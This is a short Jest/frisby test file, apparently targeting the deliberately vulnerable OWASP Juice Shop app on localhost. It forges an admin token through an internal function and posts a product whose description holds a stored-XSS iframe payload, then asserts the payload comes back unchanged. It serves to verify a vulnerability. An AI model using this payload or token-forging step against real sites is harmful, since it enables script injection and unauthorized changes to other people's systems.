// 1. Inject your benign_dependencies
import * as frisby from 'frisby'
// Note: Directly importing internal modules via relative paths is exactly what makes this a white-box test.
import * as security from '../../lib/insecurity'

const API_URL = 'http://localhost:3000/api'
// White-box privilege: bypass normal login flow and issue a high-privilege token using an internal function.
const authHeader = { Authorization: 'Bearer ' + security.authorize(), 'content-type': 'application/json' }

// 2. Wrap the Jest test block
describe('White-box vulnerability verification: API-only XSS', () => {
  it('should successfully inject and return a payload containing <iframe...>', () => {
    // 3. Inject your poc_executable_code
    return frisby.post(API_URL + '/Products', {
      headers: authHeader,
      body: {
        name: 'XSS Juice (42ml)',
        description: '<iframe src="javascript:alert(`xss`)">',
        price: 9999.99,
        image: 'xss3juice.jpg'
      }
    })
    // 4. Assertions determine whether the vulnerability exists
      .expect('status', 201) // Expect the API to accept the create request
      .expect('json', 'data', { description: '<iframe src="javascript:alert(`xss`)">' }) // Expect the backend to return the malicious payload unchanged
  })
})
